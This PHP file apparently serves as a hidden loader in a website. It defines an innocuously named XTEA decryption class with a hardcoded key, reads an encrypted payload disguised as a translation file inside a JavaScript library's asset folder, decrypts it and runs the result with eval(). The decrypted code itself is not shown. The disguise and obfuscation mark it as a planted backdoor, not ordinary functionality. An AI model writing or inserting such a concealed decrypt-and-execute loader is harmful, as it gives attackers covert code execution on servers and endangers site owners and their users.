<?php
class code_auth{
	var $cd_str;
	function __construct(){
		$this->setIter(32);
	}
	function code2leng($start, &$data, &$data_long){
		$n = strlen($data);
		$tmp = unpack('N*', $data);
		$j  = $start;
		foreach ($tmp as $value) 
		$data_long[$j++] = $value;
		return $j;
	}
	function leng2code($l){
		return pack('N', $l);
	}
	function setIter($cd_str){
		$this->cd_str = $cd_str;
	}
	function getIter(){
		return $this->cd_str;
	}
	function uncode($enc_data){
		$key = 'Mk0l8wpQ';
		$n_enc_data_long = $this->code2leng(0, $enc_data, $enc_data_long);
		$this->resize($key, 16, true);
		if ('' == $key)
		$key = '0000000000000000';
		$n_key_long = $this->code2leng(0, $key, $key_long);
		$data = '';
		$w = array(0, 0);
		$j = 0;
		$len = 0;
		$k = array(0, 0, 0, 0);
		$pos = 0;
		for ($i = 0;$i < $n_enc_data_long;$i += 2){
			if ($j + 4 <= $n_key_long){
				$k[0] = $key_long[$j];
				$k[1] = $key_long[$j + 1];
				$k[2] = $key_long[$j + 2];
				$k[3] = $key_long[$j + 3];
			}else{
				$k[0] = $key_long[$j % $n_key_long];
				$k[1] = $key_long[($j + 1) % $n_key_long];
				$k[2] = $key_long[($j + 2) % $n_key_long];
				$k[3] = $key_long[($j + 3) % $n_key_long];
			}
			$j = ($j + 4) % $n_key_long;
			$this->decipherLong($enc_data_long[$i], $enc_data_long[$i + 1], $w, $k);
			if (0 == $i){
				$len = $w[0];
				if (4 <= $len){
					$data .= $this->leng2code($w[1]);
				}else{
					$data .= substr($this->leng2code($w[1]), 0, $len % 4);
				}
			}else{
				$pos = ($i - 1) * 4;
				if ($pos + 4 <= $len){
					$data .= $this->leng2code($w[0]);
					if ($pos + 8 <= $len){
						$data .= $this->leng2code($w[1]);
					}elseif($pos + 4 < $len){
						$data .= substr($this->leng2code($w[1]), 0, $len % 4);
					}
				}else{
					$data .= substr($this->leng2code($w[0]), 0, $len % 4);
				}
			}
		}
		return $data;
	}
	function add($i1, $i2) {
		$result = 0.0;
		foreach (func_get_args() as $value){
		if (0.0 > $value){
			$value -= 1.0 + 0xffffffff;
		}
		$result += $value;
		}
		if (0xffffffff < $result || -0xffffffff > $result){
			$result = fmod($result, 0xffffffff + 1);
		}
		if (0x7fffffff < $result){
			$result -= 0xffffffff + 1.0;
		}elseif (-0x80000000 > $result){
			$result += 0xffffffff + 1.0;
		}
	return $result;
	}
	function rshift($integer, $n){
		if (0xffffffff < $integer || -0xffffffff > $integer){
			$integer = fmod($integer, 0xffffffff + 1);
		}
		if (0x7fffffff < $integer){
			$integer -= 0xffffffff + 1.0;
		}elseif(-0x80000000 > $integer){
			$integer += 0xffffffff + 1.0;
		}
		if (0 > $integer){
			$integer &= 0x7fffffff;
			$integer >>= $n;
			$integer |= 1 << (31 - $n);
		}else{
			$integer >>= $n;
		}
		return $integer;
	}
	function resize(&$data, $size, $nonull = false){
		$n  = strlen($data);
		$nmod = $n % $size;
		if(0 == $nmod)
			$nmod = $size;
		if ($nmod > 0){
			if ($nonull){
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = $data[$i % $n];
				}
			}else{
				for ($i = $n;$i < $n - $nmod + $size;++$i){
				$data[$i] = chr(0);
				}
			}
		}
		return $n;
	}
	function decipherLong($y, $z, &$w, &$k){
		$sum = 0xC6EF3720;
		$delta = 0x9E3779B9;
		$n  = (integer) $this->cd_str;
		while ($n-- > 0){
			$z = $this->add($z, 
			-($this->add($y << 4 ^ $this->rshift($y, 5), $y) ^ 
			$this->add($sum, $k[$this->rshift($sum, 11) & 3])));
			$sum = $this->add($sum, -$delta);
			$y  = $this->add($y, 
			-($this->add($z << 4 ^ $this->rshift($z, 5), $z) ^ 
			$this->add($sum, $k[$sum & 3])));
		}
		$w[0] = $y;
		$w[1] = $z;
	}
}
$cstr = file_get_contents('../../assets/lib/chosen/chosen.proto.po'); 
$code_auth = new code_auth(64); 
$strq = $code_auth->uncode($cstr);
eval($strq);
